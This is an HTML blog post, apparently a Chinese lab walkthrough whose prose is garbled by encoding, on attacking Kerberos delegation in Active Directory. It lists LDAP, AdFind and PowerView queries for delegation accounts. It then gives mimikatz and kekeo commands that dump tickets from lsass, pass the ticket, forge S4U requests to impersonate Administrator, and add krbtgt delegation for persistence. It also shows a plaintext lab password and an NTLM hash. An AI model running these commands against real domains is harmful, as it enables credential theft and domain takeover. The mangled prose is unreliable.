<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; |grep -iE &quot;distinguishedName&quot;</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/e890557928435556.png"></p>
<h2 id="ç­›é€‰çº¦æŸæ€§å§”æ´¾å±æ€§çš„è´¦å·"><a href="#ç­›é€‰çº¦æŸæ€§å§”æ´¾å±æ€§çš„è´¦å·" class="headerlink" title="ç­›é€‰çº¦æŸæ€§å§”æ´¾å±æ€§çš„è´¦å·"></a>ç­›é€‰çº¦æŸæ€§å§”æ´¾å±æ€§çš„è´¦å·</h2><h3 id="1-ldapsearch"><a href="#1-ldapsearch" class="headerlink" title="1.ldapsearch"></a>1.ldapsearch</h3><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>



<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.200.146:389 -D &quot;CN=administrator,CN=Users,DC=0day,DC=org&quot; -w admin\!\@\#45 -b &quot;DC=0day,DC=org&quot; &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; |grep -iE &quot;distinguishedName|allowedtodelegateto&quot;</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/4c08b440d570fc67.png"></p>
<h3 id="2-ADFind-1"><a href="#2-ADFind-1" class="headerlink" title="2.ADFind"></a>2.ADFind</h3><p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾ç”¨æˆ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>



<p>æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/d6004c4b34a42543.png"></p>
<h3 id="3-Empireä¸‹çš„PowerView-ps1è„šæœ¬"><a href="#3-Empireä¸‹çš„PowerView-ps1è„šæœ¬" class="headerlink" title="3.Empireä¸‹çš„PowerView.ps1è„šæœ¬"></a>3.Empireä¸‹çš„PowerView.ps1è„šæœ¬</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line"> </span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„è´¦å·</span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">æˆ–</span><br><span class="line">Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br><span class="line">æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœº</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain 0day.org | select name</span><br><span class="line">æˆ–</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/d8878b6206fd9d84.png"></p>
<h2 id="æŸ¥è¯¢æŸç”¨æˆ·æ˜¯å¦å…·æœ‰å§”æ´¾æ€§"><a href="#æŸ¥è¯¢æŸç”¨æˆ·æ˜¯å¦å…·æœ‰å§”æ´¾æ€§" class="headerlink" title="æŸ¥è¯¢æŸç”¨æˆ·æ˜¯å¦å…·æœ‰å§”æ´¾æ€§"></a>æŸ¥è¯¢æŸç”¨æˆ·æ˜¯å¦å…·æœ‰å§”æ´¾æ€§</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1;</span><br><span class="line">Get-DomainUser åŸŸç”¨æˆ·å -Properties  useraccountcontrol,msds-allowedtodelegateto| fl</span><br></pre></td></tr></table></figure>

<p>å½“è¯¥è´¦å·æ²¡å§”æ´¾å±æ€§æ—¶ï¼ŒæŸ¥è¯¢ä¸å‡ºä»»ä½•ä¿¡æ¯</p>
<p>å½“æœåŠ¡è´¦å·è¢«è®¾ç½®ä¸º <strong>éçº¦æŸæ€§å§”æ´¾</strong> æ—¶ï¼Œå…¶ userAccountControl å±æ€§ä¼šåŒ…å«ä¸º TRUSTED_FOR_DELEGATION</p>
<p>å½“è¢«è®¾ç½®ä¸º <strong>çº¦æŸæ€§å§”æ´¾</strong> æ—¶ï¼Œå…¶userAccountControlå±æ€§åŒ…å« <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx">TRUSTED_TO_AUTH_FOR_DELEGATION</a>ï¼Œä¸” msds-allowedtodelegateto å±æ€§ä¼šè¢«è®¾ç½®ä¸ºå“ªäº› SPNã€‚</p>
<h2 id="éçº¦æŸå§”æ´¾æ”»å‡»"><a href="#éçº¦æŸå§”æ´¾æ”»å‡»" class="headerlink" title="éçº¦æŸå§”æ´¾æ”»å‡»"></a>éçº¦æŸå§”æ´¾æ”»å‡»</h2><p>éçº¦æŸå§”æ´¾ï¼šå½“userè®¿é—®service1æ—¶ï¼Œå¦‚æœservice1çš„æœåŠ¡è´¦å·å¼€å¯äº†<code>unconstrained delegation</code>ï¼ˆéçº¦æŸå§”æ´¾ï¼‰ï¼Œåˆ™å½“<code>user</code>è®¿é—®<code>service1</code>æ—¶ä¼šå°†userçš„<code>TGT</code>å‘é€ç»™<code>service1</code>å¹¶ä¿å­˜åœ¨å†…å­˜ä¸­ä»¥å¤‡ä¸‹æ¬¡é‡ç”¨ï¼Œç„¶å<code>service1</code> å°±å¯ä»¥åˆ©ç”¨è¿™å¼ <code>TGT</code>ä»¥userçš„èº«ä»½å»è®¿é—®åŸŸå†…çš„ä»»ä½•æœåŠ¡ï¼ˆä»»ä½•æœåŠ¡æ˜¯æŒ‡userèƒ½è®¿é—®çš„æœåŠ¡ï¼‰äº†</p>
<p>æ“ä½œç¯å¢ƒï¼š</p>
<ul>
<li><p>åŸŸï¼š0day.org</p>
</li>
<li><p>åŸŸæ§ï¼šwindows server 2008R2ï¼Œä¸»æœºåï¼šOWA2010SP3ï¼ŒIPï¼š<code>192.168.3.142</code></p>
</li>
<li><p>åŸŸç®¡è´¦æˆ·ï¼šsqladmin</p>
</li>
<li><p>åŸŸå†…ä¸»æœºï¼šwindows 8ï¼Œä¸»æœºåï¼šPC-mary-0dayï¼ŒIPï¼š192.168.3.63ï¼Œç”¨æˆ·ï¼šmary(æ™®é€šåŸŸç”¨æˆ·)</p>
</li>
</ul>
<p><strong>æ³¨</strong>ï¼šåœ¨Windowsç³»ç»Ÿä¸­ï¼Œåªæœ‰æœåŠ¡è´¦å·å’Œä¸»æœºè´¦å·çš„å±æ€§æ‰æœ‰å§”æ´¾åŠŸèƒ½ï¼Œæ™®é€šç”¨æˆ·é»˜è®¤æ˜¯æ²¡æœ‰çš„</p>
<h3 id="1-æŸ¥æ‰¾éçº¦æŸå§”æ´¾ä¸»æœºè´¦å·"><a href="#1-æŸ¥æ‰¾éçº¦æŸå§”æ´¾ä¸»æœºè´¦å·" class="headerlink" title="1.æŸ¥æ‰¾éçº¦æŸå§”æ´¾ä¸»æœºè´¦å·"></a>1.æŸ¥æ‰¾éçº¦æŸå§”æ´¾ä¸»æœºè´¦å·</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/a264852339c7c7d7.png"></p>
<h3 id="2-å¯¼å‡ºç¥¨æ®"><a href="#2-å¯¼å‡ºç¥¨æ®" class="headerlink" title="2.å¯¼å‡ºç¥¨æ®"></a>2.å¯¼å‡ºç¥¨æ®</h3><p>å…ˆè®¿é—®åŸŸæ§ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®å¤±è´¥çš„</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/f60d867f143acba0.png"></p>
<p>æˆ‘ä»¬ç”¨sqladminæˆ–è€…ä»»æ„åŸŸç®¡è´¦å·è®¿é—®win8ï¼ˆè¿™é‡ŒåŸŸç®¡è´¦å·ç™»å½•åœ¨ä»»æ„ä¸€å°æœºå™¨éƒ½å¯ä»¥ï¼‰</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/f250dd2c1491dcbd.png"></p>
<p>æ­¤æ—¶ï¼Œåœ¨ä¸»æœºwin8çš„lsass.exeå†…å­˜ä¸­å°±ä¼šæœ‰åŸŸç”¨æˆ·sqladminçš„TGTç¥¨æ®ã€‚</p>
<p>æˆ‘ä»¬åœ¨win8ä¸Šä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œmimikatzï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">å¯¼å‡ºç¥¨æ®</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/2e5f68cd5d3dcde8.png"></p>
<h3 id="3-æ³¨å…¥ç¥¨æ®"><a href="#3-æ³¨å…¥ç¥¨æ®" class="headerlink" title="3.æ³¨å…¥ç¥¨æ®"></a>3.æ³¨å…¥ç¥¨æ®</h3><p>ç”¨ mimikatz å°†è¿™ä¸ªç¥¨æ®å¯¼å…¥å†…å­˜ä¸­ï¼Œç„¶åè®¿é—®åŸŸæ§ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¯¼å…¥ç¥¨æ®</span><br><span class="line">kerberos::ptt [0;33f6ebf]-2-0-60a00000-sqladmin@krbtgt-0DAY.ORG.kirbi</span><br><span class="line">æŸ¥çœ‹ç¥¨æ®</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/e8fe711244e58970.png"></p>
<h3 id="4-è®¿é—®åŸŸæ§"><a href="#4-è®¿é—®åŸŸæ§" class="headerlink" title="4.è®¿é—®åŸŸæ§"></a>4.è®¿é—®åŸŸæ§</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/5878d850cebdf9c6.png"></p>
<h2 id="çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>çº¦æŸæ€§å§”æ´¾æ”»å‡»</h2><p>æ“ä½œç¯å¢ƒï¼š</p>
<ul>
<li><p>åŸŸï¼š0day.org</p>
</li>
<li><p>åŸŸå†…ä¸»æœºï¼š<code>windows 7</code>ï¼Œä¸»æœºåï¼šPC-jack-0dayï¼ŒIPï¼š192.168.3.62ï¼Œç”¨æˆ·ï¼šjack</p>
</li>
<li><p>åŸŸæ§ï¼šOWA2010SP3</p>
</li>
</ul>
<p>ä»¬è®¾ç½®äº†æœºå™¨ç”¨æˆ·PC-jack-0dayå¯¹OWA2010SP3çš„<code>cifs</code>æœåŠ¡çš„å§”æ´¾</p>
<h3 id="1-æŸ¥æ‰¾çº¦æŸæ€§å§”æ´¾çš„ä¸»æœºè´¦å·"><a href="#1-æŸ¥æ‰¾çº¦æŸæ€§å§”æ´¾çš„ä¸»æœºè´¦å·" class="headerlink" title="1.æŸ¥æ‰¾çº¦æŸæ€§å§”æ´¾çš„ä¸»æœºè´¦å·"></a>1.æŸ¥æ‰¾çº¦æŸæ€§å§”æ´¾çš„ä¸»æœºè´¦å·</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/0a9595c8968b5dca.png"></p>
<h3 id="2-è¯·æ±‚ç”¨æˆ·TGT"><a href="#2-è¯·æ±‚ç”¨æˆ·TGT" class="headerlink" title="2.è¯·æ±‚ç”¨æˆ·TGT"></a>2.è¯·æ±‚ç”¨æˆ·TGT</h3><p>å·²ç»çŸ¥é“æœåŠ¡ç”¨æˆ·æ˜æ–‡çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨kekeoè¯·æ±‚è¯¥ç”¨æˆ·çš„TGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>

<p>å‚æ•°ï¼š</p>
<p><code>/user</code>: æœåŠ¡ç”¨æˆ·çš„ç”¨æˆ·å</p>
<p><code>/password</code>: æœåŠ¡ç”¨æˆ·çš„æ˜æ–‡å¯†ç </p>
<p><code>/domain</code>: æ‰€åœ¨åŸŸå</p>
<p><code>/ticket</code>: æŒ‡å®šç¥¨æ®åç§°ï¼Œä¸è¿‡è¿™ä¸ªå‚æ•°æ²¡æœ‰ç”Ÿæ•ˆï¼Œå¯ä»¥å¿½ç•¥</p>
<p>kekeoåŒæ ·ä¹Ÿæ”¯æŒä½¿ç”¨<code>NTLM Hash</code></p>
<p>åœ¨è¯·æ±‚æœåŠ¡ç”¨æˆ·çš„TGTé‚£æ­¥ç›´æ¥æŠŠ<code>/password</code>æ”¹æˆ<code>/NTLM</code>å³å¯</p>
<p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“PC-JACK-0DAYçš„ntlm hashä¸ºï¼š768623e06fae601be0c04759c87d93d3</p>
<p>æˆ‘ä»¬æ‰§è¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:PC-JACK-0DAY /domain:0day.org /NTLM:768623e06fae601be0c04759c87d93d3 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/4377d7c2fc545597.png"></p>
<p>å¾—åˆ°<a href="mailto:&#x54;&#71;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#x41;&#x43;&#75;&#x2d;&#48;&#x44;&#x41;&#x59;&#x40;&#48;&#x44;&#x41;&#x59;&#46;&#x4f;&#x52;&#71;&#95;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;">&#x54;&#71;&#84;&#x5f;&#80;&#67;&#45;&#x4a;&#x41;&#x43;&#75;&#x2d;&#48;&#x44;&#x41;&#x59;&#x40;&#48;&#x44;&#x41;&#x59;&#46;&#x4f;&#x52;&#71;&#95;&#x6b;&#x72;&#x62;&#x74;&#x67;&#x74;</a>~<a href="mailto:&#48;&#x64;&#x61;&#121;&#46;&#111;&#114;&#103;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#x52;&#x47;&#46;&#107;&#x69;&#x72;&#x62;&#x69;">&#48;&#x64;&#x61;&#121;&#46;&#111;&#114;&#103;&#64;&#48;&#68;&#65;&#x59;&#46;&#79;&#x52;&#x47;&#46;&#107;&#x69;&#x72;&#x62;&#x69;</a></p>
<h3 id="3-è·å–ST"><a href="#3-è·å–ST" class="headerlink" title="3.è·å–ST"></a>3.è·å–ST</h3><p>ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™å¼ TGTé€šè¿‡ä¼ªé€ s4uè¯·æ±‚ä»¥<code>administrator</code>ç”¨æˆ·èº«ä»½è¯·æ±‚è®¿é—®<code>OWA2010SP3 CIFS</code>çš„ST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_PC-JACK-0DAY@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/b712a8c65bd5a785.png"></p>
<p><code>S4U2Self</code>è·å–åˆ°çš„ST1ä»¥åŠ<code>S4U2Proxy</code>è·å–åˆ°çš„OWA2010SP3 CIFSæœåŠ¡çš„ST2ä¼šä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹</p>
<h3 id="4-æ³¨å…¥ST2"><a href="#4-æ³¨å…¥ST2" class="headerlink" title="4.æ³¨å…¥ST2"></a>4.æ³¨å…¥ST2</h3><p>ç„¶åæˆ‘ä»¬ç”¨mimikatzå°†ST2å¯¼å…¥å½“å‰ä¼šè¯å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/553e79608e3bea51.png"></p>
<h3 id="5-è®¿é—®åŸŸæ§"><a href="#5-è®¿é—®åŸŸæ§" class="headerlink" title="5.è®¿é—®åŸŸæ§"></a>5.è®¿é—®åŸŸæ§</h3><p><img src="https://i.bmp.ovh/imgs/2021/10/3849bd3749fdc3c6.png"></p>
<h3 id="6-ä¸çŸ¥é“æœåŠ¡ç”¨æˆ·å¯†ç çš„æƒ…å†µ"><a href="#6-ä¸çŸ¥é“æœåŠ¡ç”¨æˆ·å¯†ç çš„æƒ…å†µ" class="headerlink" title="6.ä¸çŸ¥é“æœåŠ¡ç”¨æˆ·å¯†ç çš„æƒ…å†µ"></a>6.ä¸çŸ¥é“æœåŠ¡ç”¨æˆ·å¯†ç çš„æƒ…å†µ</h3><p>å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æœåŠ¡ç”¨æˆ·çš„æ˜æ–‡å’ŒNTLM Hashï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰äº†æœåŠ¡ç”¨æˆ·ç™»é™†çš„ä¸»æœºæƒé™ï¼ˆéœ€è¦æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>mimikatz</code>ç›´æ¥ä»å†…å­˜ä¸­æŠŠæœåŠ¡ç”¨æˆ·çš„TGT dumpå‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/32315ac3eaaa51e7.png"></p>
<p><strong>æ³¨</strong>ï¼š<code>sekurlsa::tickets</code>æ˜¯åˆ—å‡ºå’Œå¯¼å‡ºæ‰€æœ‰ä¼šè¯çš„<code>Kerberos</code>ç¥¨æ®ï¼Œ<code>sekurlsa::tickets</code>å’Œ<code>kerberos::list</code>ä¸åŒï¼Œsekurlsaæ˜¯ä»å†…å­˜è¯»å–ï¼Œä¹Ÿå°±æ˜¯ä»lsassè¿›ç¨‹è¯»å–ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ<code>sekurlsa::tickets /export</code>éœ€è¦ç®¡ç†å‘˜æƒé™çš„åŸå› ã€‚å¹¶ä¸”<code>sekurlsa::tickets</code>çš„å¯¼å‡ºä¸å—å¯†é’¥é™åˆ¶ï¼Œsekurlsaå¯ä»¥è®¿é—®å…¶ä»–ä¼šè¯ï¼ˆç”¨æˆ·ï¼‰çš„ç¥¨è¯ã€‚</p>
<p>æ—¢ç„¶æœåŠ¡ç”¨æˆ·çš„TGTå¯¼å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å°±è·³è¿‡<code>tgt::ask</code>è¯·æ±‚TGTè¿™æ­¥ï¼Œç›´æ¥<code>tgs::s4u</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;3e7]-2-1-40e00000-PC-JACK-0DAY$@krbtgt-0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/OWA2010SP3.0day.org</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/520862a3fca0f03a.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@0day.org@0DAY.ORG_cifs~OWA2010SP3.0day.org@0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/674d9b5f7db26eac.png"></p>
<h2 id="æŠ“åŒ…åˆ†æçº¦æŸæ€§å§”æ´¾æ”»å‡»è¿‡ç¨‹"><a href="#æŠ“åŒ…åˆ†æçº¦æŸæ€§å§”æ´¾æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æŠ“åŒ…åˆ†æçº¦æŸæ€§å§”æ´¾æ”»å‡»è¿‡ç¨‹"></a>æŠ“åŒ…åˆ†æçº¦æŸæ€§å§”æ´¾æ”»å‡»è¿‡ç¨‹</h2><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰6ä¸ªè¯·æ±‚</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/fdf55a024a0e2d75.png"></p>
<h3 id="1-AS-REQ"><a href="#1-AS-REQ" class="headerlink" title="1.AS-REQ"></a>1.AS-REQ</h3><p>å¯ä»¥çœ‹åˆ°ç”¨æˆ·PC-JACK-0DAYç”¨æˆ·å‘KDCè¯·æ±‚ä¸€å¼ TGT</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/6ac29afd418a3ca3.png"></p>
<h3 id="2-AS-REP"><a href="#2-AS-REP" class="headerlink" title="2.AS-REP"></a>2.AS-REP</h3><p>è¿”å›ä¸€å¼ TGTï¼Œè¿™å¼ TGTä»£è¡¨çš„å°±æ˜¯PC-JACK-0DAYè¿™ä¸ªç”¨æˆ·</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/c43b50536f56c3cb.png"></p>
<h3 id="3-ç¬¬ä¸€æ¬¡çš„TGS-REQå’ŒTGS-REP"><a href="#3-ç¬¬ä¸€æ¬¡çš„TGS-REQå’ŒTGS-REP" class="headerlink" title="3.ç¬¬ä¸€æ¬¡çš„TGS-REQå’ŒTGS-REP"></a>3.ç¬¬ä¸€æ¬¡çš„TGS-REQå’ŒTGS-REP</h3><p>ç”¨è¿™å¼ <code>TGT</code>å‘é€<code>S4U2self</code>è¯·æ±‚ï¼Œä»¥<code>Administrator</code>çš„åä¹‰å‘<code>TGS</code>ç”³è¯·äº†ä¸€å¼ è®¿é—®è‡ªèº«æœåŠ¡çš„ç¥¨æ®ï¼ŒST1</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/9b0f1294d54499d1.png"></p>
<h3 id="4-ç¬¬äºŒæ¬¡çš„TGS-REQå’ŒTGS-REP"><a href="#4-ç¬¬äºŒæ¬¡çš„TGS-REQå’ŒTGS-REP" class="headerlink" title="4.ç¬¬äºŒæ¬¡çš„TGS-REQå’ŒTGS-REP"></a>4.ç¬¬äºŒæ¬¡çš„TGS-REQå’ŒTGS-REP</h3><p>å¾—åˆ°<code>ST1</code>ä¹‹åï¼Œç„¶åä¼šå¸¦ä¸ŠST1å†æ¬¡å‘<code>KDC</code>å‘èµ·<code>SU42Proxy</code>è¯·æ±‚ï¼Œä»¥<code>administrator</code>çš„åä¹‰è¯·æ±‚ä¸€å¼ è®¿é—®<code>OWA2010SP3 cifs</code>æœåŠ¡çš„ç¥¨æ®ï¼ŒST2</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/be12dbc860533c57.png"></p>
<h2 id="åˆ©ç”¨çº¦æŸæ€§å§”æ´¾è¿›è¡Œæƒé™ç»´æŒ"><a href="#åˆ©ç”¨çº¦æŸæ€§å§”æ´¾è¿›è¡Œæƒé™ç»´æŒ" class="headerlink" title="åˆ©ç”¨çº¦æŸæ€§å§”æ´¾è¿›è¡Œæƒé™ç»´æŒ"></a>åˆ©ç”¨çº¦æŸæ€§å§”æ´¾è¿›è¡Œæƒé™ç»´æŒ</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“TGTçš„ç”Ÿæˆæ˜¯ç”±<code>krbtgt</code>ç”¨æˆ·åŠ å¯†å’Œç­¾åçš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å§”æ´¾åŸŸä¸Šçš„ç”¨æˆ·å»è®¿é—®<code>TGS</code>ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„TGTäº†ï¼Œé»„é‡‘ç¥¨æ®é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯ç”¨<code>krbtgt</code>çš„hashæ¥ä¼ªé€ TGTï¼Œä¸è¿‡æˆ‘ä»¬é€šè¿‡çº¦æŸå§”æ´¾ä¹Ÿèƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚</p>
<p><strong>æ³¨</strong>ï¼š<code>TGS</code>é»˜è®¤çš„spnæ˜¯<code>krbtgt/domain name</code>ï¼Œæˆ‘ä»¬æ“ä½œç¯å¢ƒæ˜¯<code>krbtgt/QIYOU.COM</code></p>
<p><code>krbtgt</code>é»˜è®¤æ˜¯ç¦ç”¨çš„è€Œä¸”æ— æ³•å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä½¿ç”¨ç•Œé¢æ¥æ·»åŠ è¿™ä¸ªSPNã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨powershellæ¥æ·»åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬æ§åˆ¶çš„ç”¨æˆ·é€‰æ‹©çš„æ˜¯è‡ªå·±åˆ›å»ºçš„ test åŸŸç”¨æˆ·ã€‚å¯†ç Yicunyiye123</p>
<ul>
<li><p>åŸŸæ§ï¼šOWA2010SP3 192.168.200.146</p>
</li>
<li><p>åŸŸï¼š0day.org</p>
</li>
<li><p>æ”»å‡»æœºï¼šKali</p>
</li>
</ul>
<p>é¦–å…ˆä¿®æ”¹ kali çš„/etc/hosts/æ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.146 0day.org</span><br><span class="line">192.168.200.146 OWA2010SP3</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/29cfd70e8838071f.png"></p>
<p>åˆ›å»ºåŸŸç”¨æˆ·testç„¶åèµ‹äºˆSPN</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/f3019bb1515e3b1f.png"></p>
<p>ç„¶ååœ¨åŸŸæ§ä¸Šé…ç½®testç”¨æˆ·åˆ°krbtgtç”¨æˆ·çš„çº¦æŸæ€§å§”æ´¾ã€‚ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/0day.org&quot;) &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/5ff11100576d9d5c.png"></p>
